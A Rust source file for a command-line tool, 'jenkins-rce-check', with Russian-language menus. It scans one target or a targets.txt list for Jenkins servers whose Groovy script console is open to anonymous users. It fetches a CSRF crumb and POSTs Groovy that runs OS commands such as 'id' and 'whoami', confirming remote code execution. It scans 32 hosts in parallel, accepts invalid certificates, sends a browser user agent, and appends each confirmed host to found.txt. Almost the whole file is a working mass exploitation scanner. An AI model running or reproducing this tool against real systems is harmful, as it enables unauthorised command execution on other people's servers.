use std::collections::{BTreeMap, HashSet};
use std::env;
use std::fs::{self, File, OpenOptions};
use std::io::{self, Write};
use std::path::{Path, PathBuf};
use std::process::ExitCode;
use std::sync::OnceLock;
use std::time::Duration;

use futures::stream::{self, StreamExt};
use reqwest::header::{HeaderMap, HeaderValue, CONTENT_TYPE, COOKIE, SET_COOKIE};
use reqwest::{Client, RequestBuilder};
use serde::Serialize;

const UA: &str = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36";

const GROOVY: [(&str, &str); 6] = [
    ("id", r#"["id"].execute().text"#),
    ("whoami", r#"["whoami"].execute().text"#),
    ("hostname", r#"["hostname"].execute().text"#),
    ("pwd", r#"["pwd"].execute().text"#),
    ("uname", r#"["uname","-a"].execute().text"#),
    ("date", r#"["date"].execute().text"#),
];

const ENDPOINTS: [(&str, &str); 8] = [
    ("script", "/script"),
    ("scriptText", "/scriptText"),
    ("crumbIssuer", "/crumbIssuer/api/json"),
    ("api", "/api/json"),
    ("manage", "/manage"),
    ("configure", "/configure"),
    ("pluginManager", "/pluginManager/installed"),
    ("systemInfo", "/systemInfo"),
];

static NO_COLOR: OnceLock<bool> = OnceLock::new();

fn no_color() -> bool {
    *NO_COLOR.get_or_init(|| env::var_os("NO_COLOR").is_some())
}

fn paint(text: &str, code: &str) -> String {
    if no_color() {
        return text.to_string();
    }
    format!("\x1b[{code}m{text}\x1b[0m")
}

fn vcolor(verdict: &str) -> &'static str {
    match verdict {
        "rce_confirmed" => "91",
        "script_console_anonymous_proof_failed" | "script_console_anonymous_unverified" => "93",
        "no_anonymous_script_console" => "92",
        "not_jenkins" => "90",
        _ => "97",
    }
}

fn link(url: &str) -> String {
    if no_color() {
        return url.to_string();
    }
    format!("\x1b]8;;{url}\x1b\\{}\x1b]8;;\x1b\\", paint(url, "91"))
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct Endpoints {
    root: u16,
    script: u16,
    script_text: u16,
    crumb_issuer: u16,
    api: u16,
    manage: u16,
    configure: u16,
    plugin_manager: u16,
    system_info: u16,
}

#[derive(Serialize, Clone)]
struct ScanResult {
    url: String,
    version: String,
    is_jenkins: bool,
    verdict: String,
    anonymous_script_console: bool,
    proof_endpoint: Option<String>,
    proof: Option<String>,
    endpoints: Endpoints,
}

struct Resp {
    status: u16,
    headers: HeaderMap,
    body: String,
}

const CMD: &str = "id";
const TIMEOUT_SECS: u64 = 5;
const CONNECT_TIMEOUT_MS: u64 = 1500;
const PARALLEL: usize = 32;

enum Input {
    Single(String),
    Batch(Vec<String>),
}

struct Chosen {
    input: Input,
    keep_console: bool,
}

fn usage() -> &'static str {
    "jenkins-rce-check\n\
     \n\
       jenkins-rce-check <target>   проверить одну цель (url или host[:port])\n\
       jenkins-rce-check            открыть меню (двойной клик по exe — это оно)\n\
       jenkins-rce-check help       показать эту справку"
}

fn pause_console() {
    println!();
    print!("Нажмите Enter для выхода...");
    let _ = io::stdout().flush();
    let mut line = String::new();
    let _ = io::stdin().read_line(&mut line);
}

fn decode_utf16(bytes: &[u8], le: bool) -> String {
    let units: Vec<u16> = bytes
        .chunks_exact(2)
        .map(|c| {
            if le {
                u16::from_le_bytes([c[0], c[1]])
            } else {
                u16::from_be_bytes([c[0], c[1]])
            }
        })
        .collect();
    String::from_utf16_lossy(&units)
}

fn cp1251_char(b: u8) -> char {
    match b {
        0x00..=0x7F => b as char,
        0xA8 => '\u{0408}',
        0xB8 => '\u{0409}',
        0xC0..=0xFF => char::from_u32(0x0410 + (b - 0xC0) as u32).unwrap_or('\u{FFFD}'),
        0x80..=0xBF => char::from_u32(b as u32).unwrap_or('\u{FFFD}'),
    }
}

fn decode_targets(bytes: &[u8]) -> String {
    if bytes.starts_with(&[0xEF, 0xBB, 0xBF]) {
        return String::from_utf8_lossy(&bytes[3..]).into_owned();
    }
    if bytes.starts_with(&[0xFF, 0xFE]) {
        return decode_utf16(&bytes[2..], true);
    }
    if bytes.starts_with(&[0xFE, 0xFF]) {
        return decode_utf16(&bytes[2..], false);
    }
    let sample = &bytes[..bytes.len().min(64)];
    if sample.len() >= 4 {
        let even_nul = sample.iter().step_by(2).filter(|&&b| b == 0).count();
        let odd_nul = sample.iter().skip(1).step_by(2).filter(|&&b| b == 0).count();
        let threshold = sample.len() / 8;
        if odd_nul > threshold {
            return decode_utf16(bytes, true);
        }
        if even_nul > threshold {
            return decode_utf16(bytes, false);
        }
    }
    if let Ok(s) = std::str::from_utf8(bytes) {
        return s.to_string();
    }
    bytes.iter().map(|&b| cp1251_char(b)).collect()
}

fn read_targets_file() -> Result<Vec<String>, String> {
    let mut path = PathBuf::from("targets.txt");
    if !path.exists() {
        if let Ok(mut exe_dir) = env::current_exe() {
            exe_dir.pop();
            exe_dir.push("targets.txt");
            if exe_dir.exists() {
                path = exe_dir;
            }
        }
    }
    let raw = fs::read(&path)
        .map_err(|e| format!("не могу прочитать targets.txt: {e}"))?;
    let content = decode_targets(&raw);
    let targets: Vec<String> = content
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .map(str::to_string)
        .collect();
    if targets.is_empty() {
        return Err("targets.txt пуст".to_string());
    }
    Ok(targets)
}

fn prompt(message: &str) -> Option<String> {
    print!("{message}");
    let _ = io::stdout().flush();
    let mut line = String::new();
    match io::stdin().read_line(&mut line) {
        Ok(0) => None,
        Ok(_) => Some(line.trim().to_string()),
        Err(_) => None,
    }
}

fn interactive() -> Result<Chosen, i32> {
    println!("=== jenkins-rce-check ===");
    loop {
        println!();
        println!("  1) Проверить одну цель");
        println!("  2) Проверить список из targets.txt");
        println!("  3) Справка");
        println!("  0) Выход");
        let choice = match prompt("Выберите [0-3]: ") {
            Some(c) => c,
            None => {
                pause_console();
                return Err(0);
            }
        };
        match choice.as_str() {
            "1" => {
                let target = match prompt("Цель (url или host[:port]): ") {
                    Some(t) if !t.is_empty() => t,
                    Some(_) => {
                        println!("[!] пустая цель");
                        continue;
                    }
                    None => {
                        pause_console();
                        return Err(0);
                    }
                };
                return Ok(Chosen { input: Input::Single(target), keep_console: true });
            }
            "2" => match read_targets_file() {
                Ok(v) => return Ok(Chosen { input: Input::Batch(v), keep_console: true }),
                Err(e) => println!("[!] {e} (положите targets.txt рядом с exe)"),
            },
            "3" => println!("{}", usage()),
            "0" | "" => {
                pause_console();
                return Err(0);
            }
            _ => println!("[!] неверный выбор"),
        }
    }
}

fn parse_input() -> Result<Chosen, i32> {
    let raw: Vec<String> = env::args().skip(1).collect();

    if raw.iter().any(|a| matches!(a.as_str(), "help" | "-h" | "--help")) {
        println!("{}", usage());
        pause_console();
        return Err(0);
    }

    if let Some(arg) = raw.first() {
        if arg.starts_with('-') {
            eprintln!("[!] опций больше нет: {arg}");
            eprintln!("{}", usage());
            pause_console();
            return Err(2);
        }
    }

    if raw.len() > 1 {
        eprintln!("[!] укажите одну цель или запустите без аргументов для меню");
        eprintln!("{}", usage());
        pause_console();
        return Err(2);
    }

    match raw.first() {
        Some(arg) => Ok(Chosen {
            input: Input::Single(arg.clone()),
            keep_console: false,
        }),
        None => interactive(),
    }
}

fn groovy_for(name: &str) -> Option<&'static str> {
    GROOVY.iter().find(|(n, _)| *n == name).map(|(_, s)| *s)
}

fn normalize(target: &str) -> String {
    let t = target.trim();
    let lower = t.to_ascii_lowercase();
    let base = if lower.starts_with("http://") || lower.starts_with("https://") {
        t.to_string()
    } else {
        format!("http://{t}")
    };
    base.trim_end_matches('/').to_string()
}

fn reports_dir() -> PathBuf {
    env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(Path::to_path_buf))
        .unwrap_or_else(|| PathBuf::from("."))
}

// Howard Hinnant's civil_from_days -> UTC timestamp YYYYMMDD_HHMMSS.
fn timestamp() -> String {
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0);
    let days = secs.div_euclid(86_400);
    let sod = secs.rem_euclid(86_400);

    let z = days + 719_468;
    let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
    let doe = (z - era * 146_097) as u64;
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let mut year = yoe as i64 + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let day = doy - (153 * mp + 2) / 5 + 1;
    let month = if mp < 10 { mp + 3 } else { mp - 9 };
    if month <= 2 {
        year += 1;
    }

    let hour = sod / 3600;
    let minute = (sod % 3600) / 60;
    let second = sod % 60;
    format!("{year:04}{month:02}{day:02}_{hour:02}{minute:02}{second:02}")
}

fn safe_name(url: &str) -> String {
    let authority = url
        .split_once("://")
        .map(|(_, rest)| rest)
        .unwrap_or(url)
        .split(['/', '?', '#'])
        .next()
        .unwrap_or("");
    let host = if authority.is_empty() { url } else { authority };
    host.chars()
        .map(|c| if c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-') { c } else { '_' })
        .collect()
}

async fn send(builder: RequestBuilder) -> Resp {
    match builder.send().await {
        Ok(r) => {
            let status = r.status().as_u16();
            let headers = r.headers().clone();
            let body = r.text().await.unwrap_or_default();
            Resp { status, headers, body }
        }
        Err(e) => Resp { status: 0, headers: HeaderMap::new(), body: e.to_string() },
    }
}

async fn get(client: &Client, url: &str) -> Resp {
    send(client.get(url)).await
}

// Для эндпоинтов, где нужен только статус: не читаем тело вообще.
async fn get_light(client: &Client, url: &str) -> Resp {
    match client.get(url).send().await {
        Ok(r) => Resp {
            status: r.status().as_u16(),
            headers: HeaderMap::new(),
            body: String::new(),
        },
        Err(e) => Resp {
            status: 0,
            headers: HeaderMap::new(),
            body: e.to_string(),
        },
    }
}

async fn post_form(client: &Client, url: &str, headers: HeaderMap, form: &[(&str, &str)]) -> Resp {
    send(client.post(url).headers(headers).form(form)).await
}

fn cookies_from(headers: &HeaderMap) -> String {
    let mut parts = Vec::new();
    for value in headers.get_all(SET_COOKIE) {
        if let Ok(s) = value.to_str() {
            let pair = s.split(';').next().unwrap_or("").trim();
            if !pair.is_empty() {
                parts.push(pair.to_string());
            }
        }
    }
    parts.join("; ")
}

fn strip_tags(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut in_tag = false;
    for c in s.chars() {
        match c {
            '<' => in_tag = true,
            '>' => in_tag = false,
            _ if !in_tag => out.push(c),
            _ => {}
        }
    }
    out
}

fn html_unescape(s: &str) -> String {
    if !s.contains('&') {
        return s.to_string();
    }
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '&' {
            if let Some(rel) = chars[i + 1..].iter().position(|&c| c == ';') {
                let end = i + 1 + rel;
                let ent: String = chars[i + 1..end].iter().collect();
                let replacement = match ent.as_str() {
                    "amp" => Some('&'),
                    "lt" => Some('<'),
                    "gt" => Some('>'),
                    "quot" => Some('"'),
                    "apos" => Some('\''),
                    "nbsp" => Some('\u{a0}'),
                    _ => {
                        if let Some(hex) = ent.strip_prefix("#x").or_else(|| ent.strip_prefix("#X")) {
                            u32::from_str_radix(hex, 16).ok().and_then(char::from_u32)
                        } else if let Some(dec) = ent.strip_prefix('#') {
                            dec.parse::<u32>().ok().and_then(char::from_u32)
                        } else {
                            None
                        }
                    }
                };
                if let Some(c) = replacement {
                    out.push(c);
                    i = end + 1;
                    continue;
                }
            }
        }
        out.push(chars[i]);
        i += 1;
    }
    out
}

fn clean_text(s: &str) -> String {
    html_unescape(&strip_tags(s))
}

fn extract_pre_blocks(text: &str) -> Vec<String> {
    let lower = text.to_ascii_lowercase();
    let mut out = Vec::new();
    let mut pos = 0;
    while let Some(rel) = lower[pos..].find("<pre") {
        let start = pos + rel;
        let Some(gt_rel) = lower[start..].find('>') else { break };
        let content_start = start + gt_rel + 1;
        let Some(close_rel) = lower[content_start..].find("</pre") else { break };
        let content_end = content_start + close_rel;
        out.push(text[content_start..content_end].to_string());
        pos = content_end + "</pre".len();
    }
    out
}

fn parse_proof(text: &str) -> String {
    let pres = extract_pre_blocks(text);
    if !pres.is_empty() {
        let vals: Vec<String> = pres
            .iter()
            .map(|p| clean_text(p).trim().to_string())
            .filter(|v| !v.is_empty())
            .collect();
        return vals.last().cloned().unwrap_or_default();
    }
    clean_text(text).trim().chars().take(2000).collect()
}

fn jenkins_version_in_body(body: &str) -> Option<String> {
    let lower = body.to_ascii_lowercase();
    if let Some(p) = lower.find("dashboard") {
        let rest = lower[p + "dashboard".len()..].trim_start();
        if let Some(rest) = rest.strip_prefix('-') {
            if rest.trim_start().starts_with("jenkins") {
                return Some("Dashboard - Jenkins".to_string());
            }
        }
    }

    let bytes = lower.as_bytes();
    let mut search = 0;
    while let Some(rel) = lower[search..].find("jenkins") {
        let p = search + rel;
        let mut k = p + "jenkins".len();
        while k < bytes.len() && bytes[k].is_ascii_whitespace() {
            k += 1;
        }
        if k + 2 < bytes.len()
            && bytes[k].is_ascii_digit()
            && bytes[k + 1] == b'.'
            && bytes[k + 2].is_ascii_digit()
        {
            let mut e = k + 3;
            while e < bytes.len() && (bytes[e].is_ascii_digit() || bytes[e] == b'.') {
                e += 1;
            }
            return Some(body[p..e].to_string());
        }
        search = p + "jenkins".len();
    }
    None
}

fn log_line(logs: &mut String, prefix: &str, msg: &str) {
    logs.push_str(prefix);
    logs.push_str(msg);
    logs.push('\n');
}

async fn check_target(
    client: Client,
    target: String,
    cmd: String,
    prefix: String,
) -> (ScanResult, String) {
    let started = std::time::Instant::now();
    let base = normalize(&target);
    let mut logs = String::with_capacity(512);
    log_line(&mut logs, &prefix, &base);

    // Одна волна из 9 запросов: /script и /scriptText нужны с телом,
    // остальные — только статус, их тяжёлые страницы не скачиваем.
    let u_root = format!("{base}/");
    let u_script = format!("{base}/script");
    let u_script_text = format!("{base}/scriptText");
    let u_api = format!("{base}/api/json");
    let u_manage = format!("{base}/manage");
    let u_configure = format!("{base}/configure");
    let u_plugins = format!("{base}/pluginManager/installed");
    let u_system = format!("{base}/systemInfo");
    let u_crumb = format!("{base}/crumbIssuer/api/json");
    let (root, r_script, r_script_text, r_api, r_manage, r_configure, r_plugin, r_system, crumb_resp) =
        futures::join!(
            get(&client, &u_root),
            get(&client, &u_script),
            get(&client, &u_script_text),
            get_light(&client, &u_api),
            get_light(&client, &u_manage),
            get_light(&client, &u_configure),
            get_light(&client, &u_plugins),
            get_light(&client, &u_system),
            get(&client, &u_crumb),
        );

    log_line(&mut logs, &prefix, &format!("  GET / -> {}", root.status));
    let codes = [
        r_script.status,
        r_script_text.status,
        crumb_resp.status,
        r_api.status,
        r_manage.status,
        r_configure.status,
        r_plugin.status,
        r_system.status,
    ];
    for (i, (_, path)) in ENDPOINTS.iter().enumerate() {
        log_line(&mut logs, &prefix, &format!("  GET {path} -> {}", codes[i]));
    }

    let mut version = root
        .headers
        .get("x-jenkins")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_string();
    if version.is_empty() {
        version = jenkins_version_in_body(&root.body).unwrap_or_default();
    }
    let lower_body = root.body.to_ascii_lowercase();
    let is_jenkins = !version.is_empty()
        || root.headers.contains_key("x-hudson")
        || lower_body.contains("dashboard - jenkins");
    log_line(
        &mut logs,
        &prefix,
        &format!("  Jenkins={is_jenkins} version={}", if version.is_empty() { "-" } else { &version }),
    );

    let script_lower = r_script.body.to_ascii_lowercase();
    let mut script_anon =
        script_lower.contains("name=\"script\"") || script_lower.contains("name='script'");
    if !script_anon && codes[1] == 200 && r_script_text.body.to_ascii_lowercase().contains("script") {
        script_anon = true;
    }
    log_line(&mut logs, &prefix, &format!("  anonymous_script_console={script_anon}"));

    let cookie = cookies_from(&crumb_resp.headers);
    let crumb = serde_json::from_str::<serde_json::Value>(&crumb_resp.body)
        .ok()
        .and_then(|v| v.get("crumb").and_then(|c| c.as_str()).map(str::to_string))
        .unwrap_or_default();

    let mut proof = String::new();
    let mut proof_endpoint: Option<String> = None;
    if script_anon && !crumb.is_empty() {
        log_line(&mut logs, &prefix, &format!("  crumb={}", if crumb.is_empty() { "failed" } else { "ok" }));

        let mut headers = HeaderMap::new();
        if let Ok(v) = HeaderValue::from_str(&crumb) {
            headers.insert("Jenkins-Crumb", v);
        }
        headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/x-www-form-urlencoded"));
        if !cookie.is_empty() {
            if let Ok(v) = HeaderValue::from_str(&cookie) {
                headers.insert(COOKIE, v);
            }
        }

        let ep = if codes[1] == 200 { "/scriptText" } else { "/script" };
        proof_endpoint = Some(ep.to_string());
        log_line(&mut logs, &prefix, &format!("  POST {ep} ({cmd}) ..."));

        let groovy = groovy_for(&cmd).unwrap_or(GROOVY[0].1);
        let form = [("script", groovy), ("Submit", "Run")];
        let out = post_form(&client, &format!("{base}{ep}"), headers, &form).await;
        proof = parse_proof(&out.body);
        log_line(&mut logs, &prefix, &format!("  proof={}", if proof.is_empty() { "empty" } else { &proof }));
    }

    let verdict = if !is_jenkins {
        "not_jenkins"
    } else if !script_anon {
        "no_anonymous_script_console"
    } else if !proof.is_empty() {
        "rce_confirmed"
    } else {
        "script_console_anonymous_proof_failed"
    };
    log_line(
        &mut logs,
        &prefix,
        &format!("  verdict={verdict} ({:.1}s)", started.elapsed().as_secs_f64()),
    );

    (
        ScanResult {
            url: base,
            version,
            is_jenkins,
            verdict: verdict.to_string(),
            anonymous_script_console: script_anon,
            proof_endpoint,
            proof: if proof.is_empty() { None } else { Some(proof) },
            endpoints: Endpoints {
                root: root.status,
                script: codes[0],
                script_text: codes[1],
                crumb_issuer: codes[2],
                api: codes[3],
                manage: codes[4],
                configure: codes[5],
                plugin_manager: codes[6],
                system_info: codes[7],
            },
        },
        logs,
    )
}

fn prepare_path(path: &Path) {
    if let Some(parent) = path.parent() {
        if !parent.as_os_str().is_empty() {
            let _ = fs::create_dir_all(parent);
        }
    }
}

#[tokio::main]
async fn main() -> ExitCode {
    let chosen = match parse_input() {
        Ok(v) => v,
        Err(code) => return ExitCode::from(code as u8),
    };

    let (targets, batch) = match chosen.input {
        Input::Single(t) => (vec![t], false),
        Input::Batch(v) => (v, true),
    };
    let total = targets.len();

    // В txt попадают только подтверждённые цели, без повторов между запусками.
    let report_path = reports_dir().join("found.txt");
    let mut known: HashSet<String> = fs::read_to_string(&report_path)
        .unwrap_or_default()
        .lines()
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty())
        .collect();

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(TIMEOUT_SECS))
        .connect_timeout(Duration::from_millis(CONNECT_TIMEOUT_MS))
        .pool_max_idle_per_host(16)
        .user_agent(UA)
        .build()
        .expect("failed to build HTTP client");

    let mut stream = stream::iter(targets.into_iter().enumerate().map(|(i, target)| {
        let client = client.clone();
        let prefix = if batch { format!("[{}/{}] ", i + 1, total) } else { String::new() };
        async move { (i, check_target(client, target, CMD.to_string(), prefix).await) }
    }))
    .buffer_unordered(PARALLEL);

    let mut results: Vec<Option<ScanResult>> = vec![None; total];

    while let Some((i, (result, logs))) = stream.next().await {
        let prefix = if batch { format!("[{}/{}] ", i + 1, total) } else { String::new() };

        let short_proof: String = result
            .proof
            .clone()
            .unwrap_or_else(|| "-".to_string())
            .chars()
            .take(60)
            .collect::<String>()
            .replace('\n', " ");
        // Один write в консоль на цель вместо десятков — заметно быстрее на Windows.
        let mut out = logs;
        out.push_str(&prefix);
        out.push_str("RESULT ");
        out.push_str(&result.url);
        out.push_str("  ");
        out.push_str(&paint(&result.verdict, vcolor(&result.verdict)));
        out.push_str("  version=");
        out.push_str(if result.version.is_empty() { "-" } else { &result.version });
        out.push_str("  proof=");
        out.push_str(&short_proof);
        out.push('\n');
        print!("{out}");
        let _ = io::stdout().flush();

        if result.verdict == "rce_confirmed" && known.insert(result.url.clone()) {
            if let Ok(mut f) = OpenOptions::new().create(true).append(true).open(&report_path) {
                let _ = writeln!(f, "{}", result.url);
            }
        }
        results[i] = Some(result);
    }

    println!("\n=== ИТОГИ ===");
    for (idx, slot) in results.iter().enumerate() {
        let r = slot.as_ref().expect("all results collected");
        println!(
            "{:2}. {:<30} {} {}",
            idx + 1,
            r.url,
            paint(&r.verdict, vcolor(&r.verdict)),
            if r.version.is_empty() { "-" } else { &r.version }
        );
    }

    let mut counts: BTreeMap<&str, usize> = BTreeMap::new();
    for slot in results.iter() {
        let r = slot.as_ref().expect("all results collected");
        *counts.entry(&r.verdict).or_insert(0) += 1;
    }

    let ordered = [
        "rce_confirmed",
        "script_console_anonymous_proof_failed",
        "no_anonymous_script_console",
        "not_jenkins",
    ];
    for verdict in ordered {
        if let Some(&n) = counts.get(verdict) {
            if n == 0 {
                continue;
            }
            counts.remove(verdict);
            println!("  {}: {n}", paint(verdict, vcolor(verdict)));
            if verdict == "rce_confirmed" {
                for slot in results.iter() {
                    let r = slot.as_ref().expect("all results collected");
                    if r.verdict == verdict {
                        println!("    -> {}", link(&r.url));
                    }
                }
            }
        }
    }
    for (verdict, n) in counts {
        println!("  {}: {n}", paint(verdict, vcolor(verdict)));
    }

    println!("\nПодтверждено: {}", report_path.display());

    if chosen.keep_console {
        pause_console();
    }

    ExitCode::SUCCESS
}
